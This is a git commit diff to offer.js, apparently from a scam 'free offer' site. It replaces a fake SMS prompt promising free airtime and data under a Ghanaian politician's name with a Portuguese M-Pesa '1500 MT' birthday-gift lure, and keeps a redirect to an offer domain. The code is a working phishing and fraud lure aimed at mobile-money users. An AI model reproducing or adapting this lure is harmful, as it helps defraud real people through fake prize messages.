be5ea59b6e950f640fcd9d567a80bb40088b7cca
kenycruzk <kenycruzk@gmail.com>
2025-08-03 11:08:05 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
+var password = '1500 MT'
+password=prompt('SMS: Parabéns, a sua conta Mpesa qualificou-se para receber o presente de aniversário de 1500 MT Mpesa. Clique em OK para continuar. ','1500 MT');
+if (password != '1500 MT') {
 location.href='https://mahama.data-offer.xyz/15GB';
+
 }
